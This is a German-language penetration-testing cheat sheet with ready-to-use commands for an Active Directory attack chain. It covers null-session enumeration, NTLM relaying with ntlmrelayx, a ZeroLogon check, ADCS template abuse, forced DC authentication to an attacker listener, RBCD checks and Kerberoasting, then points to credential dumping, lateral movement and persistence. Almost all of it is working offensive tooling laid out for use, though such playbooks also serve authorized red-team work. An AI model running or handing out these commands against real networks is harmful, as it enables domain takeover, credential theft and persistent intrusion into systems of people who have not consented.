# LHF

#plateform/linux #target/remote #cat/LHF

% p-lhf, boris, mirror, lhf, quickwins, start, setupcheck
## [LHF-0] Setup-Check - sind die Globals gesetzt?
Erst >show. Falls leer -> tippe setup und setze domain/user/password/dc_ip. Dann diese Seite von oben durchgehen.
```
>show
```

% p-lhf, boris, mirror, lhf, recon, baseline, nxc, nullsession, unauth
## [LHF-1] Unauth Recon-Baseline (ohne Creds anfangen)
Null-Session: shares/users/pass-pol. Danach --rid-brute 5000 fuer User-Enum. Creds erbeutet? -> tippe recon + bloodhound. Volle Enum: tippe recon.
```
nxc smb <dc_ip> -u '' -p '' --shares --users --pass-pol
```

% p-lhf, boris, mirror, lhf, relay, ntlmrelayx, hintergrund, socks
## [LHF-2] Relay im Hintergrund starten (laeuft nebenbei)
ZUERST: nxc --gen-relay-list (Signing-lose Hosts) + Responder SMB/HTTP off. DANN dieser Listener mit SOCKS. Volle Kette + Details: tippe relay.
```
ulimit -n 10000; impacket-ntlmrelayx -tf <relay_file|smb_targets.txt> -smb2support -socks --output-file <output_file|ntlm_hashes.txt>
```

% p-lhf, boris, mirror, lhf, vulns, zerologon, cve, unauth, quickcheck
## [LHF-3] Unauth CVE-Quickcheck (kritische Instant-Wins)
ZeroLogon zuerst (DC-Takeover unauth). Danach PetitPotam / MS17-010 / PrintNightmare. Alle Checks: tippe vulns.
```
nxc smb <dc_ip> -u '' -p '' -M zerologon
```

% p-lhf, boris, mirror, lhf, adcs, certipy, esc, schnellcheck
## [LHF-4] ADCS-Schnellcheck (oft schnellster Weg zu DA)
Verwundbare Templates listen. ESC1/ESC8 Treffer? -> tippe adcs (ESC1 req / ESC8 relay / Golden-Cert).
```
certipy-ad find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -vulnerable -stdout
```

% p-lhf, boris, mirror, lhf, coerce, coerceplus, zuender, nxc
## [LHF-5] Coerce als Zuender (DC zur Auth zwingen)
Nur sinnvoll mit laufendem Listener (LHF-2 relay ODER LHF-4 adcs ESC8). Alle Coercion-Methoden: tippe coerce.
```
nxc smb <dc_ip> -u <user> -p '<password>' -d <domain> -M coerce_plus -o LISTENER=<lhost>
```

% p-lhf, boris, mirror, lhf, rbcd, maq, chance, nxc
## [LHF-6] RBCD-Chance pruefen (MAQ + GenericWrite?)
MAQ>0 UND GenericWrite auf ein Computerobjekt? -> RBCD moeglich. Volle Kette (addcomputer -> rbcd -> getST): tippe rbcd.
```
nxc ldap <dc_ip> -u <user> -p '<password>' -d <domain> -M maq
```

% p-lhf, boris, mirror, lhf, kerberoast, asrep, roasting, getuserspns
## [LHF-7] Roasting sobald ein Cred da ist (offline cracken)
Kerberoast (SPN-Konten) hier; AS-REP-Roast + Details: tippe creds. Hashes offline mit hashcat.
```
impacket-GetUserSPNs -request -dc-host <dc_fqdn> '<domain>/<user>:<password>'
```

% p-lhf, boris, mirror, lhf, postexploitation, crossref, next
## [LHF-8] Nach erstem Admin/Cred - naechster Schritt
Entscheide: Creds abgreifen (tippe creds), lateral bewegen (tippe lateral), oder Persistence setzen (tippe persist).
```
echo 'dump: tippe creds | move: tippe lateral | bleiben: tippe persist'
```
